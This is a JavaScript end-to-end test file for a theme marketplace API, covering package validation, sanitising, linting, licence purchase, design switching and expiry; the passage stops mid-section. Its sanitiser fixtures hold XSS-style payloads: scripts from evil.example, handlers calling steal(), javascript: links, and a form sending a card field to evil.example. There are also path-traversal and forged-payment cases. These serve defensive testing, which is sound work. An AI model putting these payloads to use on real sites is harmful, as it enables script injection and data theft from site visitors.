// Theme packages, marketplace and licences (industry designs round 2) on REAL Postgres (PGlite) through the REAL NestJS API.
// Test ids: theme.package-schema, theme.sanitiser, theme.lint, theme.marketplace, theme.switch (data), theme.expiry.
// The rendered pages (theme.render, theme.multipage, the shell and the popup) are proved in verify-themes-render.js.
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');
const { startHarness, available } = require('../e2e/bos-harness');

let pass = 0; let fail = 0; const failures = [];
const ok = (name, cond, detail) => { if (cond) { pass += 1; console.log(`  PASS  ${name}`); } else { fail += 1; failures.push(name); console.log(`  FAIL  ${name}${detail ? ` -> ${String(detail).slice(0, 500)}` : ''}`); } };
const section = (t) => console.log(`\n== ${t}`);
const J = (x) => JSON.stringify(x);
const ROOT = path.join(__dirname, '..', '..', '..');
const DAY = 86_400_000;

const readDir = (dir) => { const out = []; const walk = (rel) => { for (const e of fs.readdirSync(path.join(dir, rel))) { const p = rel ? `${rel}/${e}` : e; if (fs.statSync(path.join(dir, p)).isDirectory()) walk(p); else out.push({ path: p, data: new Uint8Array(fs.readFileSync(path.join(dir, p))) }); } }; walk(''); return out; };
const theme = (name) => readDir(path.join(ROOT, 'themes', 'reference', name));
const txt = (d) => Buffer.from(d).toString('utf8');
const withFile = (files, p, content) => [...files.filter((f) => f.path !== p), ...(content === null ? [] : [{ path: p, data: new Uint8Array(Buffer.from(content)) }])];
const edit = (files, p, fn) => withFile(files, p, fn(txt(files.find((f) => f.path === p).data)));
const errs = (r) => r.lines.filter((l) => l.level === 'error').map((l) => l.text);
const warns = (r) => r.lines.filter((l) => l.level === 'warn').map((l) => l.text);

(async () => {
  if (!(await available())) { console.log('SKIP  PGlite not installed (set G4D_PGLITE_DIR) - theme proofs not run'); process.exit(0); }
  const h = await startHarness({ port: 3095, pgPort: 54337 });
  const { prisma, call } = h;
  const core = h.dist('themes/core');
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'g4d-theme-'));
  try {
    const admin = await h.createAdmin({ key: 'themeadmin' });
    const A = admin.token;
    await call('POST', '/admin/category-packs/seed/starter', {}, A);
    const clinic = theme('clinic-calm'); const resto = theme('restaurant-hearth');

    // ───────────────────────────── package schema
    section('[feat:theme.package-schema] A valid package is accepted, an invalid one is refused with a plain sentence');
    const good = core.lintPackage(clinic);
    ok('the Clinic reference theme is accepted with no problem and no warning', good.ok && good.errors === 0 && good.warnings === 0, J(good.lines.filter((l) => l.level !== 'pass')));
    ok('the Restaurant reference theme is accepted with no problem and no warning', core.lintPackage(resto).ok && core.lintPackage(resto).warnings === 0);
    const manifestOf = (files) => JSON.parse(txt(files.find((f) => f.path === 'theme.json').data));
    const badManifest = (patch) => edit(clinic, 'theme.json', (t) => J({ ...JSON.parse(t), ...patch }));
    const cases = [
      ['a missing theme.json', withFile(clinic, 'theme.json', null), /theme\.json is missing/],
      ['a missing home page', withFile(clinic, 'home.html', null), /home\.html/],
      ['an id with capital letters or spaces', badManifest({ id: 'Clinic Calm' }), /"id" must be 3 to 40 letters/],
      ['a family that does not exist', badManifest({ families: ['spaceship'] }), /"families" must list at least one of/],
      ['no categories', badManifest({ categories: [] }), /"categories" must list the categories/],
      ['a missing author', badManifest({ author: '' }), /"author" is missing/],
      ['a version that is not a whole number', badManifest({ version: 'one' }), /"version" must be a whole number/],
      ['two pages with the same address', badManifest({ pages: [{ slug: 'x', template: 'services', title: 'A' }, { slug: 'x', template: 'about', title: 'B' }] }), /same address/],
      ['a page address the engine uses (book)', badManifest({ pages: [{ slug: 'book', template: 'services', title: 'A' }] }), /not allowed/],
      ['a page template that is not in the package', badManifest({ pages: [{ slug: 'courses', template: 'courses', title: 'C' }] }), /courses\.html is not in the package/],
      ['a Google Fonts address that is not Google', badManifest({ googleFonts: ['https://evil.example/css'] }), /googleFonts/],
    ];
    for (const [what, files, re] of cases) { const r = core.lintPackage(files); ok(`${what} is refused with a plain sentence`, !r.ok && errs(r).some((e) => re.test(e)), J(errs(r))); }
    const bd = core.readZip(core.makeZip([{ path: 'theme.json', data: new Uint8Array(Buffer.from('{}')) }]));
    ok('a readable zip is read', !bd.error && bd.files.length === 1);
    ok('a file that is not a zip is refused in plain words', /not a readable zip/.test(core.readZip(new Uint8Array(Buffer.from('hello'))).error ?? ''));
    const FE = path.join(ROOT, 'get4domain_mvp', 'src', 'engine', 'themepack', 'theme-contract.json');
    const BE = path.join(ROOT, 'backend-api', 'src', 'themes', 'core', 'theme-contract.json');
    ok('the website and the API read the same contract (the two copies of theme-contract.json are identical)', fs.readFileSync(FE).equals(fs.readFileSync(BE)));
    const contract = core.CONTRACT;
    ok('the contract lists every slot, list and engine tag used by the reference themes', clinic.concat(resto).filter((f) => f.path.endsWith('.html')).every((f) => [...txt(f.data).matchAll(/\{\{\s*([\w.]+)\s*\}\}/g)].every((m) => contract.slots.includes(m[1]) || Object.values(contract.repeaters).some((r) => r.fields.some((fl) => `${r.as}.${fl}` === m[1])) || m[1].startsWith('group.'))));
    ok('the database has the theme tables', (await prisma.themePackage.count()) === 0 && (await prisma.themeEntitlement.count()) === 0 && (await prisma.themeAsset.count()) === 0);

    // ───────────────────────────── sanitiser
    section('[feat:theme.sanitiser] Scripts, handlers, outside resources, frames and unscoped CSS are stripped or refused; a hostile package cannot reach another site or the dashboard');
    const HOSTILE_HTML = `<!doctype html><html><head><script>alert(1)</script><link rel="stylesheet" href="https://evil.example/x.css"></head><body onload="steal()">
<h1 onclick="steal()">{{site.name}}</h1><script src="https://evil.example/a.js"></script><iframe src="https://evil.example"></iframe><form action="https://evil.example"><input name="card"></form>
<a href="javascript:alert(1)">x</a><a href="data:text/html,<script>alert(1)</script>">y</a><img src="https://evil.example/pixel.png" alt=""><img src="assets/hero-art.svg" alt="ok" onerror="steal()">
<div style="background:url(https://evil.example/p.png);width:expression(alert(1))">z</div><svg><foreignObject><div>hi</div></foreignObject><animate attributeName="href" values="javascript:alert(1)"/><set attributeName="href" to="javascript:alert(2)"/></svg>
<object data="x"></object><embed src="x"><meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/"><g4d-bogus></g4d-bogus><a href="tel:+911234567890" target="_blank">call</a></body></html>`;
    const HOSTILE_CSS = `@import url("https://evil.example/x.css");
html,body{background:url(https://evil.example/p.png);color:red}
.a{behavior:url(x.htc);width:expression(alert(1))}
*{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999}
.dashboard-sidebar,#__next,nav{display:none}
.b{background:url(assets/hero-art.svg)}
@font-face{font-family:X;src:url(https://evil.example/f.woff2)}
@keyframes k{from{opacity:0}to{opacity:1}}
@media(min-width:900px){.c{color:blue}}`;
    let hostile = withFile(withFile(clinic, 'home.html', HOSTILE_HTML), 'theme.css', HOSTILE_CSS);
    const sr = core.sanitisePackage(hostile);
    // g4d-bogus is an error (not an engine tag): remove it for the strip check, keep a separate refusal check below
    const refusedBogus = !sr.ok && sr.errors.some((e) => /not an engine tag/.test(e));
    ok('an unknown engine tag is refused with the list of real ones', refusedBogus, J(sr.errors));
    hostile = withFile(hostile, 'home.html', HOSTILE_HTML.replace('<g4d-bogus></g4d-bogus>', ''));
    const sr2 = core.sanitisePackage(hostile);
    ok('the hostile package is accepted only after everything dangerous is stripped', sr2.ok && !!sr2.package, J(sr2.errors));
    const page = sr2.package ? sr2.package.pages.home : '';
    const css = sr2.package ? sr2.package.css : '';
    for (const [what, re] of [['<script>', /<script/i], ['an event handler', /\son[a-z]+\s*=/i], ['a javascript: link', /javascript:/i], ['a data: link', /href="data:/i], ['an outside picture', /evil\.example/i], ['an iframe', /<iframe/i], ['a form', /<form|<input/i], ['an object or embed', /<object|<embed/i], ['a meta refresh or base tag', /<meta|<base/i], ['an svg foreignObject, animate or set', /foreignobject|<animate|<set\b/i], ['a CSS expression', /expression\(/i], ['a style link', /<link/i]]) ok(`the page has no ${what}`, !re.test(page), page.slice(0, 200));
    ok('the allowed parts survive (heading with its slot, the safe picture, the phone link)', /<h1[^>]*>\{\{site\.name\}\}<\/h1>/.test(page) && /asset:\/\/assets\/hero-art\.svg/.test(page) && /href="tel:\+911234567890"/.test(page));
    ok('the stripped items are reported in plain words (script, handler, frame, form)', ['script', 'event handler', 'iframe', 'form'].every((w) => sr2.stripped.some((s) => s.toLowerCase().includes(w))), J(sr2.stripped).slice(0, 300));
    const postcss = require(path.join(ROOT, 'backend-api', 'node_modules', 'postcss'));
    const scope = '.g4d-theme-clinic-calm';
    const root = postcss.parse(css);
    const loose = []; root.walkRules((r) => { if (r.parent && r.parent.type === 'atrule' && /keyframes$/i.test(r.parent.name)) return; if (!r.selectors.every((s) => s.startsWith(scope))) loose.push(r.selector); });
    ok('every CSS rule is scoped to the theme (it cannot style the dashboard or another site)', loose.length === 0 && root.nodes.length > 0, J(loose));
    ok('no outside address, import, behaviour or expression is left in the CSS', !/evil\.example|@import|behavior|expression\(/i.test(css), css.slice(0, 300));
    ok('the safe CSS survives (the media query, the keyframes, the package picture)', /@media/.test(css) && /@keyframes/.test(css) && /asset:\/\/assets\/hero-art\.svg/.test(css));
    ok('a svg picture with a script inside is refused', core.svgProblem('<svg><script>alert(1)</script></svg>') !== null && core.svgProblem('<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>') === null);
    ok('a zip path that climbs out of the folder is refused', /not allowed/.test(core.readZip(core.makeZip([{ path: '../evil.html', data: new Uint8Array(1) }])).error ?? ''));
    const noBody = core.sanitiseHtml('<html><head><title>x</title><script>1</script></head></html>', { file: 'home.html', assetPaths: new Set() });
    ok('whatever is in <head> is ignored (the engine writes the head)', !/script|title/.test(noBody.html));

    // ───────────────────────────── lint
    section('[feat:theme.lint] The lint finds missing slots and tags, React projects and big pictures; --fix is safe');
    const noHero = core.lintPackage(edit(clinic, 'home.html', (t) => t.replace(/\{\{hero\.title\}\}/g, 'Welcome')));
    ok('it says when no page shows the hero title', warns(noHero).some((w) => /hero title/.test(w)), J(warns(noHero)));
    const noAction = core.lintPackage(clinic.map((f) => (f.path.endsWith('.html') ? { path: f.path, data: new Uint8Array(Buffer.from(txt(f.data).replace(/<g4d-action[^>]*><\/g4d-action>/g, ''))) } : f)));
    ok('it says when no page has the main action tag', warns(noAction).some((w) => /main action|g4d-action/.test(w)), J(warns(noAction)));
    const unknownSlot = core.lintPackage(edit(clinic, 'about.html', (t) => t.replace('{{about.text}}', '{{about.secret}}')));
    ok('it names a slot the engine does not know', warns(unknownSlot).some((w) => /about\.secret/.test(w)), J(warns(unknownSlot)));
    const react = core.lintPackage([{ path: 'package.json', data: new Uint8Array(Buffer.from('{"dependencies":{"react":"18","vite":"5"}}')) }, { path: 'src/App.tsx', data: new Uint8Array(Buffer.from('export default function App(){return null}')) }, { path: 'index.html', data: new Uint8Array(Buffer.from('<div id="root"></div>')) }]);
    ok('a React, Vite or Next project is recognised, with the advice to export static HTML', !react.ok && react.lines.some((l) => /React, Vite or Next/.test(l.text)) && react.lines.some((l) => /static HTML and CSS only/.test(l.text)), J(react.lines.map((l) => l.text)).slice(0, 300));
    const big = Buffer.concat([Buffer.from('89504e470d0a1a0a', 'hex'), crypto.randomBytes(1_300_000)]);
    const bigPic = core.lintPackage(withFile(clinic, 'assets/huge.png', null).concat([{ path: 'assets/huge.png', data: new Uint8Array(big) }]));
    ok('a picture over the size limit is refused with the limit in the sentence', !bigPic.ok && errs(bigPic).some((e) => /huge\.png/.test(e) && /MB|larger|too big|size/i.test(e)), J(errs(bigPic)));
    const lowContrast = core.lintPackage(edit(clinic, 'theme.json', (t) => J({ ...JSON.parse(t), colors: { bg: '#ffffff', fg: '#cccccc', muted: '#dddddd', accent: '#eeeeee', accentFg: '#ffffff' } })));
    ok('low colour contrast is reported', lowContrast.contrast.some((c) => !c.ok) && lowContrast.lines.some((l) => l.level !== 'pass' && /contrast/i.test(l.text)));
    // the command line
    const bad = path.join(tmp, 'bad-theme'); fs.mkdirSync(bad);
    fs.writeFileSync(path.join(bad, 'index.html'), '<!doctype html><html><body><h1>{{site.name}}</h1><script>alert(1)</script><p onclick="x()">hi</p></body></html>');
    fs.writeFileSync(path.join(bad, 'theme.css'), 'body{color:#111}.x{color:red}');
    const before = crypto.createHash('sha1').update(fs.readFileSync(path.join(bad, 'index.html'))).digest('hex');
    const cli = (args) => spawnSync(process.execPath, [path.join(ROOT, 'scripts', 'theme', 'lint.mjs'), ...args], { encoding: 'utf8' });
    const c0 = cli([bad]);
    ok('the command exits 1 and says what to do for a theme with problems', c0.status === 1 && /FAIL/.test(c0.stdout) && /--fix/.test(c0.stdout), c0.stdout.slice(0, 300));
    const c1 = cli([bad, '--fix', '--out', path.join(tmp, 'fixed')]);
    ok('--fix writes a corrected copy and reports each change; the result then has no problems (exit 0)', c1.status === 0 && fs.existsSync(path.join(tmp, 'fixed', 'home.html')) && fs.existsSync(path.join(tmp, 'fixed', 'theme.json')) && /Renamed index\.html to home\.html/.test(c1.stdout), c1.stdout.slice(0, 400));
    ok('--fix never changes your original files', crypto.createHash('sha1').update(fs.readFileSync(path.join(bad, 'index.html'))).digest('hex') === before && !fs.existsSync(path.join(bad, 'home.html')));
    ok('--fix removed the script and the handler but kept the words', !/<script|onclick/.test(fs.readFileSync(path.join(tmp, 'fixed', 'home.html'), 'utf8')) && /\{\{site\.name\}\}/.test(fs.readFileSync(path.join(tmp, 'fixed', 'home.html'), 'utf8')));
    const withPic = path.join(tmp, 'pic-theme'); fs.cpSync(path.join(ROOT, 'themes', 'reference', 'clinic-calm'), withPic, { recursive: true });
    const picBefore = crypto.createHash('sha1').update(fs.readFileSync(path.join(withPic, 'assets', 'hero-art.svg'))).digest('hex');
    cli([withPic, '--fix', '--out', path.join(tmp, 'pic-fixed')]);
    ok('--fix leaves pictures byte for byte as they were', fs.existsSync(path.join(tmp, 'pic-fixed', 'assets', 'hero-art.svg')) && crypto.createHash('sha1').update(fs.readFileSync(path.join(tmp, 'pic-fixed', 'assets', 'hero-art.svg'))).digest('hex') === picBefore);
    const cr = cli([path.join(ROOT, 'themes', 'reference', 'clinic-calm')]);
    ok('the Clinic reference theme passes the command (exit 0, no WARN, no FAIL)', cr.status === 0 && !/WARN|FAIL/.test(cr.stdout), cr.stdout.slice(0, 300));
    const zipPath = path.join(tmp, 'resto.zip'); fs.writeFileSync(zipPath, Buffer.from(core.makeZip(resto)));
    const cj = cli([zipPath, '--json']);
    let parsed = null; try { parsed = JSON.parse(cj.stdout); } catch { parsed = null; }
    ok('a zip can be linted and the report can be printed as JSON', cj.status === 0 && parsed && parsed.ok === true && Array.isArray(parsed.lines), cj.stdout.slice(0, 200));
    ok('a folder that does not exist exits 2 with a plain sentence', cli([path.join(tmp, 'nope')]).status === 2);

    // ───────────────────────────── marketplace
    section('[feat:theme.marketplace] Admin imports, prices and publishes without code; vendors see only compatible themes; preview is free; apply needs a licence; purchase uses the admin price; the webhook is idempotent');
    const zipOf = (files) => Buffer.from(core.makeZip(files));
    const imp = async (files, dry = false) => {
      const form = new FormData(); form.append('file', new Blob([zipOf(files)], { type: 'application/zip' }), 'theme.zip');
      const r = await fetch(`${h.base}/admin/themes/import${dry ? '?dryRun=1' : ''}`, { method: 'POST', headers: { Authorization: `Bearer ${A}` }, body: form });
      const j = await r.json(); return { status: r.status, body: j.data ?? j };
    };
    const dry = await imp(clinic, true);
    ok('a dry-run import checks the theme and stores nothing', dry.status < 300 && dry.body.ok === true && (await prisma.themePackage.count()) === 0, J(dry.body).slice(0, 200));
    const real = await imp(clinic);
    ok('a real import stores the theme as a DRAFT (nobody sees it yet)', real.body.ok && (await prisma.themePackage.findUnique({ where: { id: real.body.id } })).status === 'DRAFT', J(real.body).slice(0, 200));
    const again = await imp(clinic);
    ok('the same version cannot be uploaded twice (plain sentence)', !again.body.ok && errs(again.body).some((e) => /already in the marketplace/.test(e)), J(again.body).slice(0, 200));
    const tilde = await imp(withFile(withFile(withFile(clinic, 'assets/my~pic.svg', '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>'), 'about.html', txt(clinic.find((f) => f.path === 'about.html').data).replace('</main>', '<img src="assets/my~pic.svg" alt="x"></main>')), 'theme.json', J({ ...manifestOf(clinic), id: 'clinic-tilde' })));
    ok('a picture file name with ~ is refused (the engine uses that character in picture addresses)', !tilde.body.ok && errs(tilde.body).some((e) => /~/.test(e)), J(errs(tilde.body)));
    const hostileImport = await imp(withFile(withFile(clinic, 'home.html', HOSTILE_HTML.replace('<g4d-bogus></g4d-bogus>', '')), 'theme.json', J({ ...manifestOf(clinic), id: 'clinic-hostile' })));
    ok('a hostile package is imported only in its cleaned form (nothing dangerous is stored)', hostileImport.body.ok && !/<script|onclick|javascript:|evil\.example/.test((await prisma.themePackage.findUnique({ where: { id: hostileImport.body.id } })).pages.home), J(hostileImport.body).slice(0, 200));
    const id = real.body.id;
    const put = (tid, body) => call('PUT', `/admin/themes/${tid}`, body, A);
    const noPrice = await put(id, { role: 'MARKETPLACE', status: 'LIVE' });
    ok('a marketplace theme cannot go live without a price set by the admin (never a price in code)', noPrice.status === 400 && /price/i.test(noPrice.body.message), J(noPrice.body));
    const wrongCat = await put(id, { categories: ['restaurant'] });
    ok('a theme cannot be assigned to a category of another kind of business', wrongCat.status === 400 && /built for/.test(wrongCat.body.message), J(wrongCat.body));
    const badPrice = await put(id, { role: 'MARKETPLACE', priceYearlyPaise: -5 });
    ok('a negative or fractional price is refused', badPrice.status === 400, J(badPrice.body));
    const live = await put(id, { role: 'MARKETPLACE', priceYearlyPaise: 99900, status: 'LIVE' });
    ok('with a price the admin can make it a live marketplace theme without any code', live.status < 300 && live.data.status === 'LIVE' && live.data.priceYearlyPaise === 99900, J(live.body).slice(0, 200));

    const vClinic = await h.createVendor({ key: 'mkclinic', industry: 'clinic', plan: 'WORKSPACE' });
    const vResto = await h.createVendor({ key: 'mkresto', industry: 'restaurant', plan: 'WORKSPACE' });
    const flag = (v) => prisma.vendorAddon.upsert({ where: { vendorId_addonKey: { vendorId: v.id, addonKey: 'site_doc_v2' } }, create: { vendorId: v.id, addonKey: 'site_doc_v2', enabled: true }, update: { enabled: true } });
    await flag(vClinic); await flag(vResto);
    await call('POST', '/site-doc/me/generate', { packKey: 'clinic', businessName: 'Mk Clinic', city: 'Chennai' }, vClinic.token);
    await call('POST', '/site-doc/me/generate', { packKey: 'restaurant', businessName: 'Mk Resto', city: 'Chennai' }, vResto.token);
    const tabC = (await call('GET', '/site-doc/me/themes', undefined, vClinic.token)).data;
    const tabR = (await call('GET', '/site-doc/me/themes', undefined, vResto.token)).data;
    const card = tabC.themes.find((t) => t.key === 'clinic-calm');
    ok('a clinic sees the clinic theme in its marketplace tab with the price the admin set plus 18 percent GST', !!card && card.priceYearlyPaise === 99900 && card.gstPaise === Math.round(99900 * 0.18) && card.totalPaise === 99900 + Math.round(99900 * 0.18), J(tabC).slice(0, 300));
    ok('a restaurant does not see a clinic theme (only compatible themes are offered)', tabR.themes.length === 0, J(tabR).slice(0, 200));
    const sample = await call('GET', `/themes/sample/${id}?category=clinic`);
    ok('the preview of a live theme is free and public, and holds only starter content', sample.status === 200 && sample.data.theme.key === 'clinic-calm' && !/@/.test(J(sample.data.site.cms.email).replace('hello@example.com', '')), J(sample.body).slice(0, 150));
    ok('a preview for a category the theme is not for is refused', (await call('GET', `/themes/sample/${id}?category=restaurant`)).status === 400);
    const draftId = hostileImport.body.id;
    ok('a draft theme cannot be previewed without the private link token', (await call('GET', `/themes/sample/${draftId}?category=clinic`)).status === 404);
    const links = (await call('GET', `/admin/themes/${draftId}/preview-links`, undefined, A)).data;
    const tok = new URLSearchParams(links[0].path.split('?')[1]).get('token');
    ok('the admin gets a private preview link per category for a draft, and it works', links.length >= 1 && (await call('GET', `/themes/sample/${draftId}?category=${links[0].category}&token=${encodeURIComponent(tok)}`)).status === 200);
    const notOwned = await call('POST', '/site-doc/me/design', { designKey: 't:clinic-calm' }, vClinic.token);
    ok('applying a paid theme without a licence is refused in plain words (preview is free, apply needs the licence)', notOwned.status === 400 && /paid theme/i.test(notOwned.body.message), J(notOwned.body));
    const purchase = h.svc('ThemePurchaseService', 'themes/theme-purchase.service');
    const q = await purchase.quote('clinic-calm', 'clinic');
    ok('the price to pay is the admin price plus GST, worked out on the server', q.basePaise === 99900 && q.gstPaise === Math.round(99900 * 0.18) && q.totalPaise === q.basePaise + q.gstPaise);
    const order = await call('POST', '/site-doc/me/themes/clinic-calm/order', {}, vClinic.token);
    ok('when the payment cannot be started the vendor gets a plain sentence and nothing is charged', order.status === 503 && /Nothing was charged/.test(order.body.message) && !/statusCode|BAD_REQUEST/.test(order.body.message), J(order.body));
    const fakeConfirm = await call('POST', '/site-doc/me/themes/clinic-calm/confirm', { razorpayOrderId: 'order_x', razorpayPaymentId: 'pay_forged', razorpaySignature: 'forged' }, vClinic.token);
    ok('a forged confirmation starts no licence', fakeConfirm.status >= 400 && (await prisma.themeEntitlement.count({ where: { paymentRef: 'pay_forged' } })) === 0, J(fakeConfirm.body));
    const notes = { purpose: 'theme_year', vendorId: vClinic.id, themeKey: 'clinic-calm', base: String(q.basePaise), gst: String(q.gstPaise) };
    await purchase.handleCaptured({ id: 'pay_wrong_amount', notes, amount: q.totalPaise - 1 });
    ok('a payment whose amount does not match the stamped price is ignored', (await prisma.themeEntitlement.count({ where: { vendorId: vClinic.id } })) === 0);
    await purchase.handleCaptured({ id: 'pay_other', notes: { purpose: 'something_else' }, amount: q.totalPaise });
    ok('a payment that is not for a theme is ignored', (await prisma.themeEntitlement.count()) === 0);
    await purchase.handleCaptured({ id: 'pay_one', notes, amount: q.totalPaise });
    await purchase.handleCaptured({ id: 'pay_one', notes, amount: q.totalPaise });
    await purchase.handleCaptured({ id: 'pay_one', notes, amount: q.totalPaise });
    const ents = await prisma.themeEntitlement.findMany({ where: { vendorId: vClinic.id } });
    ok('the same payment message three times gives exactly one licence (idempotent webhook)', ents.length === 1 && ents[0].paymentRef === 'pay_one' && ents[0].status === 'ACTIVE', J(ents));
    ok('the licence lasts a year and records the price and the GST', Math.round((ents[0].endsAt - ents[0].startsAt) / DAY) === 365 && ents[0].amountPaise === 99900 && ents[0].gstPaise === q.gstPaise);
    const afterBuy = await call('POST', '/site-doc/me/design', { designKey: 't:clinic-calm' }, vClinic.token);
    ok('once the licence is active the vendor can apply the theme', afterBuy.status < 300, J(afterBuy.body).slice(0, 200));
    // MARKETING staff
    const { LeadspaceStaffGuard } = h.dist('leadspace/staff.guard');
    const { CommercialAdminGuard } = h.dist('commercial/foundation.services');
    const ctx = (user) => ({ switchToHttp: () => ({ getRequest: () => ({ user }) }) });
    const marketing = { role: 'ADMIN', adminRole: 'MARKETING', kind: 'admin', sub: 'm1' };
    let denied = false; try { new CommercialAdminGuard().canActivate(ctx(marketing)); } catch { denied = true; }
    let canSee = false; try { canSee = !!new LeadspaceStaffGuard().canActivate(ctx(marketing)); } catch { canSee = false; }
    const guards = (() => { const M = h.dist('themes/themes.controllers'); const reflect = (cls, fn) => Reflect.getMetadata('__guards__', cls.prototype[fn]) ?? []; return { imp: reflect(M.ThemesAdminController, 'import'), upd: reflect(M.ThemesAdminController, 'update'), rep: reflect(M.ThemesAdminController, 'report'), list: reflect(M.ThemesAdminController, 'list'), prev: reflect(M.ThemesAdminController, 'previews') }; })();
    ok('MARKETING staff can look and preview but cannot import, price, publish or read the sales report (403)', denied && canSee && [guards.imp, guards.upd, guards.rep].every((g) => g.includes(CommercialAdminGuard)) && [guards.list, guards.prev].every((g) => g.includes(LeadspaceStaffGuard)), J(Object.fromEntries(Object.entries(guards).map(([k, v]) => [k, v.map((x) => x.name)]))));
    const rep = (await call('GET', '/admin/themes/report', undefined, A)).data;
    ok('the sales report shows the licence, the revenue before GST and the GST', rep.totals.sold === 1 && rep.totals.revenuePaise === 99900 && rep.totals.gstPaise === q.gstPaise, J(rep.totals));
    // free defaults and the four slots
    const dup = (await call('POST', `/admin/themes/${id}/duplicate`, { key: 'clinic-calm-free' }, A)).data;
    ok('a theme can be copied (the copy is a draft with its own id)', !!dup && dup.status === 'DRAFT' && dup.key === 'clinic-calm-free', J(dup));
    const toFree = await put(dup.id, { role: 'FREE_DEFAULT', replacesDesign: 'warm', status: 'LIVE', categories: ['clinic'] });
    ok('a free default design takes the place of one built-in design of its category', toFree.status < 300 && toFree.data.status === 'LIVE', J(toFree.body).slice(0, 200));
    const dup2 = (await call('POST', `/admin/themes/${id}/duplicate`, { key: 'clinic-calm-two' }, A)).data;
    const clash = await put(dup2.id, { role: 'FREE_DEFAULT', replacesDesign: 'warm', status: 'LIVE', categories: ['clinic'] });
    ok('two live free designs cannot take the same slot of one category (a category has four at most)', clash.status === 409, J(clash.body));
    const noSlot = await put(dup2.id, { role: 'FREE_DEFAULT', replacesDesign: null, categories: ['clinic'] });
    ok('a free design must say which built-in design it replaces', noSlot.status === 400, J(noSlot.body));
    const designs = (await call('GET', '/site-doc/me/designs', undefined, vClinic.token)).data;
    ok('the vendor still sees exactly four designs, one of them the imported free theme', designs.designs.length === 4 && designs.designs.filter((d) => d.theme).length === 1 && designs.designs.some((d) => d.key === 't:clinic-calm-free'), J(designs.designs.map((d) => d.key)));
    ok('the designs answer also carries the shell (words, bottom bar, popup steps) for the editor', !!designs.shell && designs.shell.bottomNav.length === 5 && designs.shell.popup.steps.length >= 2, J(designs.shell).slice(0, 200));

    // ───────────────────────────── switch (data)
    section('[feat:theme.switch] Switching between built-in designs and imported themes keeps every word, item and picture');
    const vSw = await h.createVendor({ key: 'swclinic', industry: 'clinic', plan: 'WORKSPACE' });
    await flag(vSw);
    await call('POST', '/site-doc/me/generate', { packKey: 'clinic', businessName: 'Sw Clinic', city: 'Madurai' }, vSw.token);
    await call('PUT', '/site-doc/me/draft', { about: 'We are a small family clinic.', tagline: 'Gentle care', extras: { headline: 'Gentle care in Madurai', faq: [{ q: 'Do you take walk-ins?', a: 'Yes, before noon.' }] } }, vSw.token);
    const content = async () => { const v = (await call('GET', '/site-doc/me', undefined, vSw.token)).data; const d = v.doc; return J({ about: d.about, tagline: d.tagline, headline: d.extras?.headline, faq: d.extras?.faq, items: (await prisma.vendorProduct.count({ where: { vendorId: vSw.id } })), portfolio: d.portfolio, name: d.businessName, phone: d.phone, banner: d.banner }); };
    const c0s = await content();
    const seq = ['bold', 't:clinic-calm-free', 'classic', 'minimal', 't:clinic-calm-free', 'warm'];
    const seen = [];
    for (const k of seq) { const r = await call('POST', '/site-doc/me/design', { designKey: k }, vSw.token); seen.push(`${k}:${r.status}`); }
    ok('every switch (built-in to imported, imported to built-in, in a row) is accepted', seen.every((s) => /:200$|:201$/.test(s)), seen.join(' '));
    ok('after six switches every word, item, picture and setting is exactly as before', (await content()) === c0s);
    const imported = await call('POST', '/site-doc/me/design', { designKey: 't:no-such-theme' }, vSw.token);
    ok('a theme that does not exist cannot be applied (plain sentence, nothing changes)', imported.status === 400 && (await content()) === c0s, J(imported.body));
    const w = await call('POST', '/site-doc/me/design', { designKey: 't:clinic-calm' }, vSw.token);
    ok('another vendor without a licence still cannot apply the paid theme', w.status === 400);

    // ───────────────────────────── expiry
    section('[feat:theme.expiry] Expiry falls back to the free default design, content untouched; renewal restores; reminders once each; a retired theme is safe');
    const expiry = h.svc('ThemeExpiryService', 'themes/theme-expiry.service');
    const publicSite = async (sub) => (await call('GET', `/cms/site/${sub}`)).data;
    // the clinic vendor owns clinic-calm (paid); publish with it applied
    await call('POST', '/site-doc/me/publish', {}, vClinic.token);
    const sub = vClinic.subdomain;
    const live0 = await publicSite(sub);
    ok('a live site with an active licence renders the paid theme', live0?.themeRef?.key === 'clinic-calm' && live0.cms.designKey === 't:clinic-calm' && live0.themeNotice === null, J({ ref: live0?.themeRef, dk: live0?.cms?.designKey, n: live0?.themeNotice }));
    const keep = (s) => J({ about: s.cms.about, tagline: s.cms.tagline, extras: s.cms.extras, portfolio: s.cms.portfolio, products: s.products.map((p) => [p.name, p.price]), name: s.cms.businessName });
    const k0 = keep(live0);
    const future = new Date(Date.now() + 366 * DAY);
    const run1 = await expiry.runOnce(future);
    const live1 = await publicSite(sub);
    ok('when the year ends the licence is marked EXPIRED and the site falls back to the category free default design', run1.expired === 1 && live1.themeRef?.key !== 'clinic-calm' && live1.themeNotice?.kind === 'expired', J({ run1, ref: live1.themeRef, n: live1.themeNotice }));
    ok('the vendor is told, in plain words, that the theme ended and how to renew', /ended/.test(live1.themeNotice?.message ?? '') && /Renew/.test(live1.themeNotice?.message ?? ''), live1.themeNotice?.message);
    ok('everything the vendor wrote is untouched by the expiry', keep(live1) === k0);
    ok('the vendor got an in-app notice that the theme ended', (await prisma.notification.count({ where: { recipientId: vClinic.id, type: 'theme_expired' } })) === 1);
    const again2 = await expiry.runOnce(future);
    ok('running the daily job again changes nothing (no second notice)', again2.expired === 0 && (await prisma.notification.count({ where: { recipientId: vClinic.id, type: 'theme_expired' } })) === 1, J(again2));
    await purchase.handleCaptured({ id: 'pay_renew', notes, amount: q.totalPaise });
    const live2 = await publicSite(sub);
    ok('renewing restores the theme at once', live2.themeRef?.key === 'clinic-calm' && live2.themeNotice === null, J({ ref: live2.themeRef, n: live2.themeNotice }));
    const renew = await prisma.themeEntitlement.findUnique({ where: { paymentRef: 'pay_renew' } });
    await purchase.handleCaptured({ id: 'pay_renew_early', notes, amount: q.totalPaise });
    const early = await prisma.themeEntitlement.findUnique({ where: { paymentRef: 'pay_renew_early' } });
    ok('renewing early starts the new year when the current one ends (no day lost, none paid twice)', early.startsAt.getTime() === renew.endsAt.getTime() && Math.round((early.endsAt - early.startsAt) / DAY) === 365, J({ a: renew.endsAt, b: early.startsAt }));
    // reminders
    const vRem = await h.createVendor({ key: 'remind', industry: 'clinic', plan: 'WORKSPACE' });
